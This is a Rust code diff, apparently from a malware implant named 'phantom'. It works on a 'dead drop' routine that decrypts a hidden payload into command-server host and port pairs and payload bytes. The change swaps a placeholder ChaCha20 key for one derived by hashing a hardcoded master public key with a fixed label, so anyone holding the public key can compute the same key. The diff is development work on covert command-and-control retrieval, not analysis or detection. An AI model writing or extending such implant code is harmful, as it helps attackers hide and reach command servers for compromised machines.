@@ -29,11 +29,22 @@ const MASTER_PUB_KEY: [u8; 32] = [
     0xe7, 0x38, 0x99, 0xcc, 0x79, 0x3d, 0xb8, 0x6a
 ];
 
-// Shared Key for ChaCha20 (Derived or Hardcoded?)
-// Report says "Encrypted". Assuming a shared secret or derived from Master Key (ECDH)
-// For "Dead Drop", usually a Symmetric Key is embedded in the binary to decrypt.
-// Let's use a hardcoded fallback key for this generic retrieval.
-const FALLBACK_DECRYPT_KEY: [u8; 32] = [0x99; 32]; // Placeholder
+// Shared Key for ChaCha20 (Derived from Master Public Key using HKDF)
+// In production, this should use ECDH for perfect forward secrecy.
+// For dead drop recovery, we derive a deterministic key from the master.
+fn derive_fallback_key() -> [u8; 32] {
+    use sha2::{Sha256, Digest};
+    
+    // HKDF-like derivation: key = SHA256(MASTER_PUB_KEY || "phantom-fallback-v1")
+    let mut hasher = Sha256::new();
+    hasher.update(&MASTER_PUB_KEY);
+    hasher.update(b"phantom-fallback-v1");
+    let result = hasher.finalize();
+    
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&result);
+    key
+}
 
 #[derive(Serialize)]
 struct RpcRequest {
@@ -177,7 +188,7 @@ fn try_decrypt_payload(hex_data: &str) -> Option<(Vec<(String, u16)>, Vec<u8>)> 
     }
     
     // 3. Decrypt
-    let cipher = ChaCha20Poly1305::new(Key::from_slice(&FALLBACK_DECRYPT_KEY));
+    let cipher = ChaCha20Poly1305::new(Key::from_slice(&derive_fallback_key()));
     let nonce = Nonce::from_slice(iv_slice);
     
     match cipher.decrypt(nonce, encrypted_data) {
